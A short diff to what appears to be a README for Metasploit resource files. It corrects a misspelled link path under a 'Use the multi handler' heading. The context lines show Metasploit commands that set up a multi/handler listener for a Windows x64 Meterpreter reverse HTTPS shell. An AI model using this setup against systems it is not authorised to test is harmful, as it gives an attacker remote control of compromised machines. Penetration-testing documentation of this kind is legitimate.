@@ -36,7 +36,7 @@ host           origin        service        public         private              
 ```
 
 ## Use the multi handler
-##### Prepare file for [multi hander](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/resouece/multihandler.rc.txt)
+##### Prepare file for [multi hander](https://github.com/DharmaDoll/Metasploit-resource-files/blob/main/resources/multihandler.rc.txt)
 ```
 use exploit/multi/handler;
 set payload windows/x64/meterpreter/reverse_https;
